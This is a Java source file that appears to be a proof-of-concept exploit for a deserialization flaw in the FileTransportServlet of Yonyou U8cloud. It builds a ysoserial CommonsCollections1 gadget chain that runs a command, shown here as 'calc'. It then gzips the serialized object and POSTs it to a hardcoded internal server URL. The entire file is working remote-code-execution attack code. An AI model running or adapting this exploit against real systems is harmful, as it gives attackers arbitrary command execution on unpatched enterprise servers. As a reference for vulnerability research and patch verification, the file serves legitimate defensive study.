package cve.u8cloud;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

import java.io.*;
import java.util.zip.GZIPOutputStream;


/**
 * U8cloud所有版本FileTransportServlet反序列化漏洞
 * https://security.yonyou.com/#/patchInfo?foreignKey=eb893884876e4bc2acd04ee40dc4cb5f
 */
public class FileTransportServlet_deserialize {

    public static void main(String[] args) throws Exception {


        String url = "http://10.58.120.201:8088/servlet/~iufo/nc.ui.iufo.server.center.FileTransportServlet";
        String gadget = "CommonsCollections1";
        String cmd = "calc";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);


        FileOutputStream fos = new FileOutputStream("D:\\tmp\\calc.gz");
        GZIPOutputStream gos = new GZIPOutputStream(fos);
        ObjectOutputStream oos = new ObjectOutputStream(gos);
        oos.writeObject(obj);

        oos.close();
        gos.close();
        fos.close();

        FileInputStream fis = new FileInputStream("D:\\tmp\\calc.gz");

        byte[] bytes = new byte[4096];
        int bytesRead;
        while ((bytesRead = fis.read(bytes)) != -1) {
            for (int i = 0; i < bytesRead; i++) {
                System.out.print(bytes[i] + " ");
            }
        }
        fis.close();

        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpRequest.sendByteArrayPost(httpPost, bytes);
    }
}


